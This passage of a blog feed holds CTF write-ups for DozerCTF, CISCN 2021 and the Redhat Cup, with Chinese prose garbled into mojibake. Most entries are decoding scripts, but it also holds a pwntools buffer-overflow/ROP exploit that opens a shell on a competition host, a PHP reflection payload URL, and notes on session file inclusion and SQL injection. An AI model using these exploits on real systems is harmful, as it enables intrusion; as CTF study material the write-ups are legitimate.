class="line">tmp=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)//<span class="number">8</span>):</span><br><span class="line">tmp.append(res[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="PwnPwnPwn"><a href="#PwnPwnPwn" class="headerlink" title="PwnPwnPwn"></a>PwnPwnPwn</h2><p>è°ƒç”¨getså‡½æ•°ç›´æ¥å‘stringå†™å…¥/bin/shï¼Œå¾—åˆ°flagï¼šDozerctf{pwn_is_so_good_i_love_pwn}</p><p><img src="https://i.loli.net/2021/05/30/obXMryfBxDkiutW.png"></p><p>é™„ä¸Šexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;1.14.160.21&quot;</span>,<span class="string">&quot;20001&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x401313</span>)+p64(<span class="number">0x404060</span>)+p64(<span class="number">0x401080</span>)+p64(<span class="number">0x401176</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="i-wanna-å¤§æ™šä¸Šç‰¹ä¾›ç‰ˆ"><a href="#i-wanna-å¤§æ™šä¸Šç‰¹ä¾›ç‰ˆ" class="headerlink" title="i wanna å¤§æ™šä¸Šç‰¹ä¾›ç‰ˆ"></a>i wanna å¤§æ™šä¸Šç‰¹ä¾›ç‰ˆ</h2><p>gm8decompilerè§£åŒ…å¾—åˆ°<code>.gmk</code>æ–‡ä»¶åœ¨gamemakeä¸­æ‰“å¼€ï¼Œæœ€ç»ˆåœ¨èƒŒæ™¯å›¾ä¸­æ‰¾åˆ°flagï¼šDozerctf{i_wanna_To_be_THE_gay}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\gm8decompiler.exe &quot;I Wanna Be The Guy Remake 8.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/30/FU31aVvwsJBkQuo.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ç®€å•åŸŸæ¸—é€â…¡-1"><a href="#ç®€å•åŸŸæ¸—é€â…¡-1" class="headerlink" title="ç®€å•åŸŸæ¸—é€â…¡-1"></a>ç®€å•åŸŸæ¸—é€â…¡-1</h2><p>æ ¹æ®æç¤ºè´¦å·å¯†ç ä¸ºdozer/dozer123è¿›å…¥åå°ï¼Œå‘ç°æœ‰æ—¥å¿—ï¼Œç¿»äº†ç¿»æ‰¾åˆ°äº†æ–‡ä»¶åæˆåŠŸåä¸Šå¤§ä½¬çš„è½¦</p><p><img src="https://i.loli.net/2021/05/30/WfgBUHoAE7aP4iK.png"></p><p>äºæ˜¯ä¹ç›´æ¥è¯»flagå¾—åˆ°flagï¼šDozerctf{k94jf8ejdbzks2l4o40rjdnfewrkyosd}</p><p><img src="https://i.loli.net/2021/05/30/N7x5BGktsX6J4Ei.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DozerCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬14å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›-åˆ›æ–°å®è·µèƒ½åŠ›èµ›</title>
      <link href="2021/05/16/2021CISCN/"/>
      <url>2021/05/16/2021CISCN/</url>
      
        <content type="html"><![CDATA[<blockquote><p>CTFé«˜è€ƒå¥½è€¶ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210516190309.jpg"></p></blockquote><h1 id="ç¬¬ä¸€å·-Web"><a href="#ç¬¬ä¸€å·-Web" class="headerlink" title="ç¬¬ä¸€å·-Web"></a>ç¬¬ä¸€å·-Web</h1><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>æ¥æºäºï¼š<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>phpåå°„ï¼Œä½¿ç”¨ReflectionMethodå†…ç½®ç±»çš„getDocCommentæ–¹æ³• , ç„¶åçˆ†ç ´ä¸€ä¸‹rbçš„å€¼å¾—çŸ¥å‡½æ•°åqï¼Œè¿›è€Œå¾—åˆ°flagï¼šCISCN{1yVxf-Nt5Gc-ITZhp-6rqwI-2sE6S-}</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.116.229.178:25042&#x2F;?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210516150651068.png"></p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>æŠ¥é”™æ³¨å…¥ + æ— åˆ—åæ³¨å…¥</p><p>å·ä¸åŠ¨äº†~</p><h1 id="ç¬¬ä¸€å·-Misc"><a href="#ç¬¬ä¸€å·-Misc" class="headerlink" title="ç¬¬ä¸€å·-Misc"></a>ç¬¬ä¸€å·-Misc</h1><h2 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny_traffic"></a>tiny_traffic</h2><p>é¦–å…ˆåœ¨æµé‡åŒ…ä¸­æå–å‡ºtestä¸secretä¸¤ä¸ªbræ–‡ä»¶</p><p>æ¥ç€æˆ‘ä»¬æ‰¾åˆ°è„šæœ¬è§£ç å¾—åˆ°å¯¹åº”çš„proto3æ–‡ä»¶test1ã€secret1</p><p>é™„ä¸Š<a href="https://pan.baidu.com/s/1acusuaH05vnw4Mczjj1qSQ"><strong>ä¸‹è½½åœ°å€</strong></a>ï¼ˆæå–ç ï¼šddqlï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python brotlipython.py test test1</span><br><span class="line">python brotlipython.py secret secret1</span><br></pre></td></tr></table></figure><p>æœ€ååœ¨ç”¨protocè§£å¯†ï¼Œæ•´ç†å¾—åˆ°flagï¼šCISCN{e66a22e23457889b0fb1146d172a38dc}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --decode&#x3D;PBResponse test1 &lt; secret1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210516192658597.png"></p><p>é™„ä¸Šå®‰è£…protocå‘½ä»¤ï¼ˆLinux-kaliï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PROTOC_ZIP&#x3D;protoc-3.14.0-linux-x86_64.zip</span><br><span class="line">curl -OL https:&#x2F;&#x2F;github.com&#x2F;protocolbuffers&#x2F;protobuf&#x2F;releases&#x2F;download&#x2F;v3.14.0&#x2F;$PROTOC_ZIP</span><br><span class="line">sudo unzip -o $PROTOC_ZIP -d &#x2F;usr&#x2F;local bin&#x2F;protoc</span><br><span class="line">sudo unzip -o $PROTOC_ZIP -d &#x2F;usr&#x2F;local &#39;include&#x2F;*&#39;</span><br><span class="line">rm -f $PROTOC_ZIP</span><br></pre></td></tr></table></figure><h2 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h2><p>é¦–å…ˆåˆ†è§£gifï¼ˆå¾—åˆ†è§£ä¸ºpngæˆ–è€…bmpçš„ï¼Œè¦æ˜¯jpgæœ€åæ•´å‡ºæ¥å¯èƒ½ä¼šå¯¼è‡´åƒç´ ä¿¡æ¯æŸå¤±ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert running_pixel.gif .&#x2F;out&#x2F;out.png</span><br></pre></td></tr></table></figure><p>æ¥ç€æŠŠæ¯ä¸€å¸§çš„rgbæ˜¯233 233 233çš„åƒç´ æ”¾åˆ°ä¸€å¼ å›¾ä¸Šï¼Œè·‘ä¸‹è„šæœ¬å¾—åˆ°ç”»å¥½çš„382å¼ å›¾</p><p>å…³é”®å°±åœ¨äºé€šè¿‡å¯¹æ¯”æ¯åå¸§é‡Œçš„ç›¸åŒçš„å›¾ç‰‡ï¼Œè¿›è€Œæ‰¾åˆ°ï¼ˆ233ï¼Œ233ï¼Œ233ï¼‰è¿™ä¸ªç‚¹</p><p>æœ€åè§£å‡ºæ¥äº†å‡ºé¢˜äººè¿˜è¦æ¶å¿ƒä½ ä¸€ä¸‹ï¼Œä¸€å¸§ä¸€å¸§æŒ‰é¡ºåºå»çœ‹å°±èƒ½å¾—åˆ°flagï¼šCISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00}ï¼ˆPSï¼š382å¼ å›¾ï¼Œå­—è¿˜ç‰¹å°ï¼‰</p><center>æ”¾ä¸ªflagçš„gifæ¼”ç¤ºå›¾</center><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021ciscngifflag.gif"></p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">IMG = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">400</span>,<span class="number">400</span>), (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;./out/out-&#x27;</span>+<span class="built_in">str</span>(m)+<span class="string">&#x27;.png&#x27;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">            p1 = img.getpixel((i,j))</span><br><span class="line">            <span class="keyword">if</span> p1==(<span class="number">233</span>,<span class="number">233</span>,<span class="number">233</span>):</span><br><span class="line">                IMG.putpixel((j,i),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    IMG.save(<span class="string">&#x27;./gif/&#x27;</span>+<span class="built_in">str</span>(m)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">print(<span class="built_in">len</span>(res))</span><br><span class="line">plt.imshow(IMG)</span><br><span class="line">plt.show()</span><br><span class="line">IMG.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="ç¬¬ä¸€å·-Reverse"><a href="#ç¬¬ä¸€å·-Reverse" class="headerlink" title="ç¬¬ä¸€å·-Reverse"></a>ç¬¬ä¸€å·-Reverse</h1><h2 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h2><p>åç¼–è¯‘å‘ç°åœ¨soå±‚åŠ å¯†ï¼Œè§£åŒ…æ‰“å¼€IDAï¼Œåˆ†æå‡½æ•°å¾—çŸ¥æ˜¯rc4åŠ å¯†ï¼Œè·‘ä¸‹è„šæœ¬å¾—åˆ°flagï¼šCISCN{6654d84617f627c88846c172e0f4d46c}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210516145155448879.jpg"></p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">res = [<span class="number">0xA3</span>, <span class="number">0x1A</span>, <span class="number">0xE3</span>, <span class="number">0x69</span>, <span class="number">0x2F</span>, <span class="number">0xBB</span>, <span class="number">0x1A</span>, <span class="number">0x84</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, <span class="number">0xAD</span>, <span class="number">0xAD</span>, <span class="number">0x9E</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x1F</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0x4F</span>, <span class="number">0xE1</span>, <span class="number">0xEB</span>, <span class="number">0xAF</span>, <span class="number">0xF0</span>, <span class="number">0xEA</span>, <span class="number">0xC4</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0x42</span>, <span class="number">0xC7</span>, <span class="number">0x6E</span>, <span class="number">0x3F</span>, <span class="number">0xB0</span>, <span class="number">0xD3</span>, <span class="number">0xCC</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0x98</span>, <span class="number">0x3F</span>]</span><br><span class="line">key = <span class="string">b&quot;12345678&quot;</span></span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line">key = <span class="built_in">list</span>(key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    res[i] ^= key[i % <span class="number">8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">39</span>, <span class="number">3</span>):</span><br><span class="line">    tmp0 = res[i]</span><br><span class="line">    tmp1 = res[i+<span class="number">1</span>]</span><br><span class="line">    tmp2 = res[i+<span class="number">2</span>]</span><br><span class="line">    res[i] = tmp1 ^ tmp2</span><br><span class="line">    res[i+<span class="number">2</span>] = tmp0 ^ res[i]</span><br><span class="line">    res[i+<span class="number">1</span>] = res[i+<span class="number">2</span>] ^ tmp2</span><br><span class="line">print(rc4.decrypt(<span class="built_in">bytes</span>(res)))</span><br></pre></td></tr></table></figure><h1 id="ç¬¬äºŒå·-Web"><a href="#ç¬¬äºŒå·-Web" class="headerlink" title="ç¬¬äºŒå·-Web"></a>ç¬¬äºŒå·-Web</h1><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>sessionæ–‡ä»¶åŒ…å«</p><p>æ‰«æwebæ–‡ä»¶å¾—åˆ°äº†.listingï¼Œ.listingæ–‡ä»¶å†…å®¹æœ‰ä¸ªphpæ–‡ä»¶you_can_seeeeeeee_me.php</p><p>è®¿é—®you_can_seeeeeeee_me.phpæ˜¯ä¸ªphpinfo()ï¼Œæœ‰å¼€PHP_SESSION_UPLOAD_PROGRESSï¼Œå¹¶ä¸”æ‹¿åˆ°äº†sessionçš„è·¯å¾„: /var/lib/php/sessions/jehaahfcad/</p><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨æ–‡ä»¶åŒ…å«æ‰§è¡Œè¿™ä¸ª/var/lib/php/sessions/jehaahfcad/sess_xxxxxxxxxxæ–‡ä»¶</p><p>phpinfoæœ‰banäº†å‡½æ•° , ä¸èƒ½æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥ç”¨scandirå»è¯»å–ç›®å½•</p><h1 id="ç¬¬äºŒå·-Misc"><a href="#ç¬¬äºŒå·-Misc" class="headerlink" title="ç¬¬äºŒå·-Misc"></a>ç¬¬äºŒå·-Misc</h1><h2 id="éš”ç©ºä¼ è¯"><a href="#éš”ç©ºä¼ è¯" class="headerlink" title="éš”ç©ºä¼ è¯"></a>éš”ç©ºä¼ è¯</h2><p>é¦–å…ˆæˆ‘ä»¬æ‹¿åˆ°äº†ä¸€å †åŠ å¯†çš„é€šè¯æ•°æ®ï¼Œå¾—çŸ¥æ˜¯çŸ­ä¿¡ç¼–ç ä¸­çš„<a href="http://www.sendsms.cn/pdu/"><strong>PDU</strong></a>ï¼ˆä½†æ˜¯ç»™çš„æ•°æ®è¿‡å¤šï¼Œæ‡’ç‹—è‚¯å®šæƒ³åŠæ³•æ•´ä¸ªæ‰¹é‡çš„</p><p>é™„ä¸Šæ‰¹é‡è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>)</span><br><span class="line">url = <span class="string">&#x27;https://www.smspdu.be/&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;ppdu&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdu&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Decode&#x27;</span>&#125;</span><br><span class="line">rep = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;TD&gt;(.*?)&lt;/TD&gt;&#x27;</span>)</span><br><span class="line">ff = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rr = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rr)):</span><br><span class="line">    c = rr[i]</span><br><span class="line">    data[<span class="string">&#x27;pdu&#x27;</span>] = c.strip()</span><br><span class="line">    r = requests.post(url,data).text</span><br><span class="line">    res = re.findall(rep,<span class="built_in">str</span>(r))</span><br><span class="line">    print(c)</span><br><span class="line">    print(res[<span class="number">20</span>])</span><br><span class="line">    ff.write(res[<span class="number">20</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>æ¥ç€æ ¹æ®pduä¿¡æ¯é‡Œæœ¬èº«åŒ…å«çš„æ—¶é—´ä¿¡æ¯æ’åºï¼Œæ’èµ·æ¥å°±æ˜¯ä¸€å¼ pngï¼ˆæŒ‡çš„æ˜¯åé¢çš„16è¿›åˆ¶æ•°æ®</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202105161497675.png"></p><p>é™„ä¸Šæ’åºè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>).readlines()</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>).readlines()</span><br><span class="line">res = &#123;&#125;</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="built_in">len</span>(f)):</span><br><span class="line">    l = f[i][<span class="number">42</span>:<span class="number">44</span>][::-<span class="number">1</span>]+f[i][<span class="number">44</span>:<span class="number">46</span>][::-<span class="number">1</span>]</span><br><span class="line">    res[<span class="built_in">int</span>(l)] = f1[i-<span class="number">4</span>].strip()</span><br><span class="line">    print(l)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;final.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3924</span>,<span class="number">4938</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f2.write(res[i])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>æœ€åcrcçˆ†ç ´å®½åº¦ä¼šå‘ç°å‰é¢è§£ç ç»™çš„w465æ„æ€å°±æ˜¯å®½åº¦æ˜¯465ï¼Œè¿›è€Œæ•´ç†å¾—åˆ°flagï¼šCISCN{15030442_b586_4c9e_b436_26def12293e4}ï¼ˆæ‰‹åŠ¨æ»‘ç¨½~</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021051614564975461.png"></p><h1 id="ç¬¬ä¸‰å·-Misc"><a href="#ç¬¬ä¸‰å·-Misc" class="headerlink" title="ç¬¬ä¸‰å·-Misc"></a>ç¬¬ä¸‰å·-Misc</h1><h2 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h2><p>æŠŠTCPçš„ç¬¬ä¸€ä¸ªæµå¯¼å‡ºæ¥ï¼Œç„¶åæ‰€æœ‰çš„åæ ‡éƒ½åœ¨é‡Œé¢ï¼Œæå–ä¸€ä¸‹å°±èƒ½å¾—åˆ°flagï¼šCISCN{easy_robo_xx}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021051641220212136.png"></p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;tmp&#x27;</span>).read()</span><br><span class="line">reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;tgPos.*?]&#x27;</span>)</span><br><span class="line">res = re.findall(reg,f)</span><br><span class="line">print(res)</span><br><span class="line">print(<span class="built_in">len</span>(res))</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">500</span>,<span class="number">500</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res[:-<span class="number">1</span>]:</span><br><span class="line">    tmp = <span class="built_in">eval</span>(i.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">2</span>])</span><br><span class="line">    img.putpixel((tmp[<span class="number">0</span>],tmp[<span class="number">1</span>]),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">img.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›</title>
      <link href="2021/05/09/2021redhat/"/>
      <url>2021/05/09/2021redhat/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p><a href="https://pan.baidu.com/s/1M-GL3y5ES14xURbx4qCVJQ"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šzlxuï¼‰</p><p>EBCDICè§£ç å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210509852121242506.png"></p><h2 id="colorful-code"><a href="#colorful-code" class="headerlink" title="colorful code"></a>colorful code</h2><p><a href="https://pan.baidu.com/s/1tBm_L_HkNkXUp5s1j4KMWw"><strong>é™„ä»¶</strong></a>ï¼ˆæå–ç ï¼šh3w8ï¼‰</p><p>data2ä¸‰ä¸ªä¸€ç»„è½¬RGB,ç„¶ådata1é‡Œçš„æ•°å­—å°±æ˜¯å¯¹åº”çš„RGBçš„ä½ç½®ï¼Œç„¶åæ ¹æ®data1çš„å­—ç¬¦æ•°é‡åˆ†è§£è´¨å› æ•°å¾—åˆ°å®½é«˜ï¼Œæœ€åç”»å›¾å»npietè§£</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210509191152075.png"></p><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;data1&#x27;</span>)</span><br><span class="line">c1 = f1.read()</span><br><span class="line">c1 = c1.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(<span class="built_in">len</span>(c1))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;data2&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">3</span>):</span><br><span class="line">    yyy = c[i*<span class="number">3</span>:i*<span class="number">3</span>+<span class="number">3</span>]</span><br><span class="line">    r,g,b = yyy[<span class="number">0</span>],yyy[<span class="number">1</span>],yyy[<span class="number">2</span>]</span><br><span class="line">    res.append((r,g,b))</span><br><span class="line">print(<span class="built_in">len</span>(res))</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">rr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c1[:-<span class="number">1</span>]:</span><br><span class="line">    rr.append(res[<span class="built_in">int</span>(i)])</span><br><span class="line">print(rr)</span><br><span class="line">a = <span class="number">191</span></span><br><span class="line">b = <span class="number">37</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(b,a),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a):</span><br><span class="line">        img.putpixel((j,i),rr[i+j*a])</span><br><span class="line">plt.imshow(img)</span><br><span class="line">img.save(<span 